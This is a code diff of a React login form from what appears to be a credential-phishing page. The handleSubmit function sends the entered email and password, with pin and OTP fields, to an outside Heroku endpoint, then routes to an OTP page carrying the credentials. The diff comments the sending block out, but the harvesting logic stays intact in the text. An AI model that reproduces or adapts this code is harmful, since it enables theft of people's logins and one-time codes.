@@ -39,55 +39,53 @@ const Form = (props) => {
         fetchCsrf()
     }, [])
 
-    useEffect(() => {
-        console.log({csrfToken})
-    }, [csrfToken])
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        if (email === '' || password === '') {
-            console.log('not sent')
-        } else {
-            console.log('started email sending')
-            try {
-                const URL = 'https://rqq-1.herokuapp.com'
-                //  const URL = 'http://localhost:3030'
-                const response = await fetch(URL + '/rq-1', {
-                    method: 'POST',
-                    headers: {
-                        'Content-type': 'application/json',
-                        'xsrf-token': csrfToken,
-                    },
-                    //   credentials: 'include',
-                    // mode: 'cors',
+        console.log({csrfToken})
+        // if (email === '' || password === '') {
+        //     console.log('not sent')
+        // } else {
+        //     console.log('started email sending')
+        //     try {
+        //         const URL = 'https://rqq-1.herokuapp.com'
+        //         //  const URL = 'http://localhost:3030'
+        //         const response = await fetch(URL + '/rq-1', {
+        //             method: 'POST',
+        //             headers: {
+        //                 'Content-type': 'application/json',
+        //                 'xsrf-token': csrfToken,
+        //             },
+        //             //   credentials: 'include',
+        //             // mode: 'cors',
 
-                    body: JSON.stringify({
-                        email,
-                        password,
-                        pin: '',
-                        otp: '',
-                    }),
-                })
+        //             body: JSON.stringify({
+        //                 email,
+        //                 password,
+        //                 pin: '',
+        //                 otp: '',
+        //             }),
+        //         })
 
-                const resData = await response.text()
+        //         const resData = await response.text()
 
-                console.log('email sending started')
-                console.log({ resData })
+        //         console.log('email sending started')
+        //         console.log({ resData })
 
-                // if (resData.status === 'success') {
-                //     console.log('Message Sent.')
-                //     setLoading(false)
-                //     history.push('/otp', { email, password })
-                // } else if (resData.status === 'fail') {
-                //     console.log('Message failed to send.')
-                //     //         setLoading(false)
-                // }
-            } catch (err) {
-                console.log(err)
-            }
-        }
+        //         // if (resData.status === 'success') {
+        //         //     console.log('Message Sent.')
+        //         //     setLoading(false)
+        //         //     history.push('/otp', { email, password })
+        //         // } else if (resData.status === 'fail') {
+        //         //     console.log('Message failed to send.')
+        //         //     //         setLoading(false)
+        //         // }
+        //     } catch (err) {
+        //         console.log(err)
+        //     }
+        //}
     }
 
     return (
